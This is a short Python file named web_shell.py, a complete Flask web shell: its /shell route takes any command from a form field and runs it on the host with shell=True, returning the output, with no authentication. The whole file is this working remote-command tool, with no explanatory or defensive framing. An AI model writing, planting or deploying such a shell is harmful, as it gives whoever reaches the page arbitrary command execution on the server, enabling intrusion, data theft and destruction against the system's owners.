# web_shell.py
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        cmd = request.form['cmd']
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        output = stdout.decode() + stderr.decode()
        return f"<pre>{output}</pre>"
    return """
    <form method="POST">
        <input type="text" name="cmd" size="100">
        <input type="submit" value="Execute">
    </form>
    """

if __name__ == '__main__':
    app.run(debug=False)